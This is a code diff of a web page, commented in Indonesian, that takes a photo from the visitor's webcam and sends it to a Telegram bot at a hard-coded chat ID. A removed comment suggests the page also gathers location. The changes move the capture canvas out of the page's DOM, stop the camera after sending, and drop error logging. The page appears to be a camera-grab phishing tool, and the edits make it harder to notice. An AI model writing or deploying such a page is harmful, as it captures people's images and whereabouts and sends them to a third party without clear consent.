@@ -17,7 +17,6 @@
         </button>
 
         <video id="video" class="hidden w-full h-auto rounded-lg mt-4" autoplay playsinline></video>
-        <canvas id="canvas" class="hidden"></canvas>
         
         <div id="status" class="mt-4 text-sm text-yellow-400 font-medium"></div>
     </div>
@@ -27,7 +26,6 @@
         const CHAT_ID = '6128943834';
 
         const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
 
@@ -47,14 +45,15 @@
         }
 
         async function takePhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg');
+            // Membuat elemen canvas sementara di memori saja (tidak dimasukkan ke DOM/HTML)
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth;
+            tempCanvas.height = video.videoHeight;
+            tempCanvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imageData = tempCanvas.toDataURL('image/jpeg');
 
             status.innerText = "Mengirim foto...";
-            
-            // Kirim foto tanpa menunggu lokasi agar lebih cepat
             sendToTelegram(imageData);
         }
 
@@ -74,12 +73,13 @@
                 if (result.ok) {
                     status.innerText = "✅ Foto berhasil dikirim!";
                     status.classList.replace('text-yellow-400', 'text-green-400');
+                    // Stop kamera setelah sukses
+                    video.srcObject.getTracks().forEach(track => track.stop());
                 } else {
                     status.innerText = "Error API: " + result.description;
                 }
             } catch (e) {
                 status.innerText = "Gagal koneksi ke Telegram.";
-                console.error(e);
             }
         }
 
